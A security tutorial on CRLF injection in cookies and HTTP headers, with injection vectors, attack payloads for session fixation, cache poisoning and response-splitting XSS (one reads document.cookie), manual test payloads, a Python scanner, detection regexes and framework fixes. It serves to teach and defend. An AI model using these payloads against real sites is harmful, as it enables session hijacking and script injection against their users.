# CRLF Injection in Cookies

CRLF (Carriage Return Line Feed) injection in cookie contexts occurs when attackers can manipulate HTTP headers to inject additional Set-Cookie directives or other headers. This vulnerability class is particularly dangerous as it can lead to session fixation, cache poisoning, and XSS.

## Technical Background

### CRLF Characters

```
CR (Carriage Return): \r (0x0D)
LF (Line Feed):       \n (0x0A)
CRLF sequence:        \r\n
```

### HTTP Header Parsing

HTTP headers are separated by CRLF sequences. When user input containing CRLF is included in HTTP headers, it can lead to:

1. **Header injection**
2. **Response splitting**
3. **Cache poisoning**
4. **Session fixation**

## Injection Vectors

### 1. Location Header Injection

```http
GET /redirect?url=https://attacker.com%0D%0ASet-Cookie:%20evil=value HTTP/1.1
Host: victim.com

# Server responds with:
HTTP/1.1 302 Found
Location: https://attacker.com
Set-Cookie: evil=value
```

### 2. Custom Header Injection

```http
GET /page HTTP/1.1
Host: victim.com
X-Custom-Header: value%0D%0ASet-Cookie:%20injected=test
```

### 3. Cookie Reflection

```http
GET /page HTTP/1.1
Host: victim.com
Cookie: test=value%0D%0AX-Injected:%20header

# If the cookie is reflected:
Set-Cookie: test=value
X-Injected: header
```

## Attack Scenarios

### Session Fixation

```python
# Attack payload
payload = "https://legitimate-site.com\r\nSet-Cookie: session=ATTACKER_CONTROLLED"

# Request
requests.get(f"https://victim.com/redirect?url={urllib.parse.quote(payload)}")
```

### Cache Poisoning

```http
GET /api/endpoint?param=value%0D%0AContent-Length:%200%0D%0A%0D%0AHTTP/1.1%20200%20OK%0D%0AContent-Type:%20text/html%0D%0A%0D%0A<script>alert('XSS')</script> HTTP/1.1
Host: victim.com
```

### XSS via Response Splitting

```javascript
// Malicious payload
let payload = `\r\nContent-Type: text/html\r\n\r\n<script>alert(document.cookie)</script>`;
let encodedPayload = encodeURIComponent(payload);

// Attack URL
window.location = `https://victim.com/page?param=${encodedPayload}`;
```

## Browser Behavior Differences

### Chrome/Edge (Chromium)

- Strict CRLF handling
- Rejects most header injection attempts
- Normalizes some CRLF sequences

### Firefox

- More permissive CRLF handling
- May allow some injection scenarios
- Different encoding behavior

### Safari

- Unique CRLF processing
- May handle encoded CRLF differently
- ITP affects cookie behavior

## Detection Techniques

### Server-Side Detection

```python
def detect_crlf_injection(header_value):
    """Detect potential CRLF injection in header values"""
    
    dangerous_patterns = [
        r'\r\n',           # Literal CRLF
        r'%0D%0A',         # URL-encoded CRLF
        r'%0d%0a',         # Lowercase URL-encoded
        r'\u000D\u000A',   # Unicode CRLF
        r'&#13;&#10;',     # HTML-encoded CRLF
        r'\x0D\x0A'        # Hex-encoded CRLF
    ]
    
    for pattern in dangerous_patterns:
        if re.search(pattern, header_value, re.IGNORECASE):
            return True
    
    return False

def sanitize_header_value(value):
    """Remove CRLF sequences from header values"""
    
    # Remove all types of CRLF
    sanitized = re.sub(r'[\r\n\u000D\u000A\x0D\x0A]', '', value)
    
    # Remove URL-encoded CRLF
    sanitized = re.sub(r'%0[Dd]%0[Aa]', '', sanitized)
    
    # Remove HTML-encoded CRLF
    sanitized = re.sub(r'&#1[03];', '', sanitized)
    
    return sanitized
```

### Client-Side Detection

```javascript
function detectCRLFAttempt(url) {
    // Check for CRLF in URL parameters
    const patterns = [
        /%0[dD]%0[aA]/,  // URL-encoded CRLF
        /\r\n/,          // Literal CRLF
        /&#13;&#10;/     // HTML-encoded CRLF
    ];
    
    for (let pattern of patterns) {
        if (pattern.test(url)) {
            console.warn('Potential CRLF injection detected:', url);
            return true;
        }
    }
    
    return false;
}
```

## Prevention Strategies

### 1. Input Validation

```python
def safe_redirect(url):
    """Safely handle redirect URLs to prevent CRLF injection"""
    
    # Whitelist allowed schemes
    parsed = urllib.parse.urlparse(url)
    if parsed.scheme not in ['http', 'https']:
        raise ValueError("Invalid URL scheme")
    
    # Remove any CRLF characters
    safe_url = re.sub(r'[\r\n]', '', url)
    
    # Additional validation
    if not is_valid_redirect_url(safe_url):
        raise ValueError("Invalid redirect URL")
    
    return safe_url

def set_safe_cookie(response, name, value):
    """Set cookie with CRLF protection"""
    
    # Sanitize cookie value
    safe_value = re.sub(r'[\r\n]', '', value)
    
    # Use framework's built-in cookie setting method
    response.set_cookie(
        name,
        safe_value,
        secure=True,
        httponly=True,
        samesite='Strict'
    )
```

### 2. Output Encoding

```python
def encode_header_value(value):
    """Properly encode values for HTTP headers"""
    
    # Remove control characters
    cleaned = ''.join(char for char in value if ord(char) >= 32)
    
    # Encode for HTTP header context
    encoded = urllib.parse.quote(cleaned, safe='')
    
    return encoded
```

### 3. Framework-Specific Solutions

#### Express.js
```javascript
app.get('/redirect', (req, res) => {
    const url = req.query.url;
    
    // Validate and sanitize
    try {
        const parsed = new URL(url);
        // Remove CRLF
        const safeUrl = url.replace(/[\r\n]/g, '');
        res.redirect(302, safeUrl);
    } catch (e) {
        res.status(400).send('Invalid URL');
    }
});
```

#### Flask
```python
from flask import Flask, redirect, request, make_response
import re

@app.route('/redirect')
def safe_redirect():
    url = request.args.get('url', '')
    
    # Remove CRLF characters
    safe_url = re.sub(r'[\r\n]', '', url)
    
    # Create response
    response = make_response(redirect(safe_url))
    
    # Ensure no CRLF in headers
    for header, value in response.headers.items():
        response.headers[header] = re.sub(r'[\r\n]', '', value)
    
    return response
```

#### Spring Boot
```java
@GetMapping("/redirect")
public ResponseEntity<Void> safeRedirect(@RequestParam String url) {
    // Remove CRLF characters
    String safeUrl = url.replaceAll("[\\r\\n]", "");
    
    // Create safe redirect
    HttpHeaders headers = new HttpHeaders();
    headers.add("Location", safeUrl);
    
    return new ResponseEntity<>(headers, HttpStatus.FOUND);
}
```

## Testing for CRLF Injection

### Manual Testing Payloads

```
# Basic CRLF injection
%0D%0ASet-Cookie:%20test=injected

# CRLF with additional headers
%0D%0AX-Injected:%20header%0D%0ASet-Cookie:%20test=value

# Response splitting
%0D%0A%0D%0A<html><body>Injected Content</body></html>

# Complex payload
%0D%0ASet-Cookie:%20session=evil;%20HttpOnly;%20Secure%0D%0AX-XSS-Protection:%200
```

### Automated Testing

```python
def test_crlf_injection(base_url, parameter):
    """Test for CRLF injection vulnerabilities"""
    
    payloads = [
        "%0D%0ASet-Cookie:%20test=injected",
        "\r\nSet-Cookie: evil=value",
        "%0D%0AX-Injected: header",
        "test\r\nSet-Cookie: evil=value"
    ]
    
    results = []
    
    for payload in payloads:
        url = f"{base_url}?{parameter}={payload}"
        
        try:
            response = requests.get(url, allow_redirects=False)
            
            # Check for injected headers
            if 'test' in response.cookies or 'evil' in response.cookies:
                results.append({
                    'payload': payload,
                    'vulnerable': True,
                    'evidence': dict(response.cookies)
                })
            
            # Check for injected headers
            for header in ['x-injected', 'x-xss-protection']:
                if header in response.headers:
                    results.append({
                        'payload': payload,
                        'vulnerable': True,
                        'evidence': {header: response.headers[header]}
                    })
                    
        except Exception as e:
            print(f"Error testing {payload}: {e}")
    
    return results
```

## Real-World Examples

### CVE-2021-22118 (Spring Framework)

- **Vulnerability**: CRLF injection in WebFlux
- **Impact**: HTTP response splitting
- **Cause**: Insufficient header validation
- **Fix**: Enhanced header sanitization

### E-commerce Platform Incident (2020)

- **Issue**: CRLF in redirect parameter
- **Impact**: Session fixation attacks
- **Root Cause**: Missing input validation
- **Fix**: Comprehensive redirect validation

## Security Headers

Use security headers to mitigate CRLF injection impact:

```http
# Prevent response splitting XSS
X-XSS-Protection: 1; mode=block

# Prevent content type sniffing
X-Content-Type-Options: nosniff

# Frame options to prevent clickjacking
X-Frame-Options: DENY

# Strict Transport Security
Strict-Transport-Security: max-age=31536000; includeSubDomains
```

## References

1. OWASP - HTTP Response Splitting
2. CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers
3. RFC 7230: HTTP/1.1 Message Syntax and Routing
4. "Web Application Hacker's Handbook" - Chapter 12
5. SANS Reading Room: "CRLF Injection Vulnerabilities"
